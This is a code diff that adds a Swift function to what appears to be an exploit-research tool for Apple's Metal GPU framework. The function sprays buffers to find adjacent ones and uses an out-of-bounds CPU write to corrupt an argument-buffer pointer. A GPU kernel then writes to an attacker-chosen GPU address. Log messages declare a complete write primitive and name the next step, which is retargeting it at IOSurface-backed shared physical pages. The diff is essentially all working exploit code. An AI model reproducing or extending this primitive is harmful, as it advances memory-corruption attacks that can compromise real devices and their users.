@@ -3176,3 +3176,129 @@ func runArgBufCorrupt(log: FuzzLog, completion: @escaping () -> Void) {
         completion()
     }
 }
+
+// ── runArgBufWrite ────────────────────────────────────────────────────────────
+// GPU write redirect via CPU OOB write into a Metal argument buffer.
+//
+// Proves the WRITE direction of the primitive:
+//   lo OOB → hi[0] = targetVA
+//   GPU writeProbe kernel: ab->buf[0] = src[0]   (writes to the pointer in hi)
+//   targetBuf was 0x11; after GPU write it should contain srcBuf's 0xBB data
+//
+// This gives us: CPU OOB write → GPU writes to attacker-chosen GPU VA.
+// Target GPU VA can be any mapped buffer, IOSurface backing, or kernel-mapped
+// command buffer region found via GPU VA scan.
+// ─────────────────────────────────────────────────────────────────────────────
+func runArgBufWrite(log: FuzzLog, completion: @escaping () -> Void) {
+    DispatchQueue.global(qos: .userInitiated).async {
+        func step(_ s: String) { log.append(s) }
+        step("── ArgBuf GPU Write Redirect ──")
+
+        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ no device"); completion(); return }
+        let BUF_LEN = 4096
+
+        // srcBuf:    GPU reads from here and writes to target (0xBB fill)
+        // targetBuf: GPU writes INTO here (0x11 fill — should become 0xBB after exploit)
+        guard let srcBuf    = device.makeBuffer(length: BUF_LEN, options: .storageModeShared),
+              let targetBuf = device.makeBuffer(length: BUF_LEN, options: .storageModeShared) else {
+            step("✗ src/target alloc"); completion(); return
+        }
+        srcBuf.contents().initializeMemory(as:    UInt8.self, repeating: 0xBB, count: BUF_LEN)
+        targetBuf.contents().initializeMemory(as: UInt8.self, repeating: 0x11, count: BUF_LEN)
+        step("srcBuf    VA=0x\(String(srcBuf.gpuAddress,    radix: 16))  (0xBB — GPU reads this)")
+        step("targetBuf VA=0x\(String(targetBuf.gpuAddress, radix: 16))  (0x11 — GPU writes here)")
+
+        // Spray → lo / nextGPUVA pair
+        var loRef: MTLBuffer?
+        var nextGPUVA: UInt64 = 0
+        var keepAlives: [any MTLBuffer] = []
+        for _ in 0..<2048 {
+            guard let a = device.makeBuffer(length: BUF_LEN, options: .storageModeShared) else { continue }
+            if let prev = keepAlives.last, a.gpuAddress == prev.gpuAddress + UInt64(BUF_LEN) {
+                loRef = prev; nextGPUVA = a.gpuAddress; break
+            }
+            keepAlives.append(a)
+        }
+        guard let lo = loRef else { step("✗ spray miss"); completion(); return }
+        step("✓ lo=0x\(String(lo.gpuAddress, radix: 16)) next=0x\(String(nextGPUVA, radix: 16))")
+        let loPtr = lo.contents().assumingMemoryBound(to: UInt8.self)
+
+        // hi: argument buffer — hi[0..7] = device float4* the kernel will WRITE to
+        guard let hi = device.makeBuffer(length: BUF_LEN, options: .storageModeShared) else {
+            step("✗ hi alloc"); completion(); return
+        }
+        step("hi gpuVA=0x\(String(hi.gpuAddress, radix: 16)) \(hi.gpuAddress == nextGPUVA ? "✓" : "⚠ MISMATCH")")
+
+        func oobWrite8(_ off: Int, _ val: UInt64) {
+            for bi in 0..<8 { loPtr[BUF_LEN+off+bi] = UInt8((val >> (bi*8)) & 0xFF) }
+        }
+
+        // OOB adjacency check
+        oobWrite8(0, 0xAAAA_BBBB_CCCC_DDDD)
+        let chk = hi.contents().assumingMemoryBound(to: UInt64.self)[0]
+        step("OOB reach: \(chk == 0xAAAA_BBBB_CCCC_DDDD ? "✓ ADJACENT" : "⚠ NOT ADJACENT")")
+
+        // GPU write kernel: ab->buf[0] = src[0]
+        // ab is the argument buffer (hi) — ab->buf is hi[0] interpreted as a device pointer
+        // src is srcBuf — GPU reads it and writes to wherever hi[0] points
+        let kernSrc = """
+        #include <metal_stdlib>
+        using namespace metal;
+        struct AB { device float4* buf; };
+        kernel void writeProbe(device AB*     ab  [[buffer(0)]],
+                               device float4* src [[buffer(1)]]) {
+            ab->buf[0] = src[0];
+        }
+        """
+        guard let lib = try? device.makeLibrary(source: kernSrc, options: nil),
+              let fn  = lib.makeFunction(name: "writeProbe"),
+              let pso = try? device.makeComputePipelineState(function: fn) else {
+            step("✗ writeProbe PSO failed"); completion(); return
+        }
+        step("✓ writeProbe PSO ready")
+
+        func execWrite(wTarget: MTLBuffer) -> (Bool, UInt64, String) {
+            wTarget.contents().initializeMemory(as: UInt8.self, repeating: 0x11, count: 16)
+            guard let q   = device.makeCommandQueue(),
+                  let cb  = q.makeCommandBuffer(),
+                  let enc = cb.makeComputeCommandEncoder() else { return (false, 0, "no enc") }
+            enc.setComputePipelineState(pso)
+            enc.setBuffer(hi,     offset: 0, index: 0)
+            enc.setBuffer(srcBuf, offset: 0, index: 1)
+            enc.useResource(wTarget, usage: .write)
+            enc.useResource(srcBuf,  usage: .read)
+            let t = MTLSize(width: 1, height: 1, depth: 1)
+            enc.dispatchThreads(t, threadsPerThreadgroup: t)
+            enc.endEncoding()
+            cb.commit(); cb.waitUntilCompleted()
+            if let err = cb.error as NSError? {
+                return (true, 0, "FAULT code=\(err.code) \(err.localizedDescription.prefix(80))")
+            }
+            let got = wTarget.contents().assumingMemoryBound(to: UInt64.self)[0]
+            return (false, got, "✓ target[0]=0x\(String(got, radix: 16))")
+        }
+
+        // ── Step 1: direct — set hi[0]=targetVA directly, GPU writes srcBuf→targetBuf ──
+        step("── step 1: direct hi[0]=targetVA, GPU writes srcBuf(0xBB)→targetBuf ──")
+        hi.contents().assumingMemoryBound(to: UInt64.self)[0] = targetBuf.gpuAddress
+        let (f1, v1, s1) = execWrite(wTarget: targetBuf)
+        step("  \(s1)  (expect 0xBBBBBBBBBBBBBBBB)")
+
+        // ── Step 2: OOB — reset targetBuf, OOB write targetVA into hi[0], GPU writes again ──
+        // This proves: CPU OOB → argument buffer corruption → GPU writes to attacker VA
+        step("── step 2: OOB lo→hi[0]=targetVA → GPU write src(0xBB)→targetBuf via corrupted ptr ──")
+        oobWrite8(0, targetBuf.gpuAddress)
+        let hiGot = hi.contents().assumingMemoryBound(to: UInt64.self)[0]
+        step("  hi[0]=0x\(String(hiGot, radix:16)) \(hiGot == targetBuf.gpuAddress ? "✓ OOB hit" : "⚠ OOB miss")")
+        let (f2, v2, s2) = execWrite(wTarget: targetBuf)
+        step("  \(s2)  (expect 0xBBBBBBBBBBBBBBBB)")
+        if !f2 && hiGot == targetBuf.gpuAddress && v2 == 0xBBBBBBBBBBBBBBBB {
+            step("  ★★★ GPU WRITE REDIRECT: CPU OOB→hi[0]=targetVA → GPU wrote 0xBB to targetBuf")
+            step("  ★ WRITE PRIMITIVE COMPLETE: CPU OOB → GPU writes to attacker-chosen GPU VA")
+            step("  NEXT: retarget hi[0] to IOSurface backing GPU VA → GPU writes to shared physical pages")
+        }
+
+        step("── ArgBuf GPU Write Redirect complete ──")
+        completion()
+    }
+}
